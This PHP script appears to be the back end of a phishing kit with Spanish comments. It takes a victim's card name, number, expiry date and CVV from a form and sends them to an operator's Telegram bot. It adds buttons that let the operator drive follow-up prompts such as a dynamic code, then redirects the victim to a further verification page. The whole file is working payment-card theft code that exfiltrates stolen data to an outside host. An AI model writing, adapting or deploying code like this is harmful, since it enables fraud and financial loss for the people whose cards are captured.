<?php
date_default_timezone_set("America/Bogota");

// Obtener los datos del formulario
$nombre = $_POST['nombre'] ?? '';
$numero = $_POST['numero'] ?? '';
$fecha = $_POST['fecha'] ?? '';
$cvv = $_POST['cvv'] ?? '';

// Cargar configuración del bot
$config = json_decode(file_get_contents("botmaster2.php"), true);
$token = $config['token'];
$chat_id = $config['chat_id'];

// Crear mensaje
$mensaje = "
<b>💳 NUEVA TARJETA INGRESADA</b>
────────────────────
👤 <b>Nombre:</b> $nombre
💳 <b>Numero:</b> $numero
📆 <b>Vencimiento:</b> $fecha
🔐 <b>CVV:</b> $cvv
────────────────────";

// Crear botones
$transactionId = uniqid(); // ID único para distinguir la sesión
$keyboard = json_encode([
    "inline_keyboard" => [
        [["text" => "Error Logo", "callback_data" => "error_logo:$transactionId"]],
        [["text" => "Error TC", "callback_data" => "error_tc:$transactionId"]],
        [["text" => "Dinámica", "callback_data" => "dinamica:$transactionId"]],
        [["text" => "Error Dinámica", "callback_data" => "error_dinamica:$transactionId"]]
    ]
]);

// Enviar mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$params = [
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "parse_mode" => "HTML",
    "reply_markup" => $keyboard
];
$options = [
    "http" => [
        "header"  => "Content-type: application/json",
        "method"  => "POST",
        "content" => json_encode($params)
    ]
];
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Guardar datos en localStorage para JS si se requiere
echo "<script>
    localStorage.setItem('transactionId', '$transactionId');
    localStorage.setItem('carddata', JSON.stringify({
        nombre: '$nombre',
        numero: '$numero',
        fecha: '$fecha',
        cvv: '$cvv'
    }));
    window.location.href = 'verifidata.php';
</script>";
?>
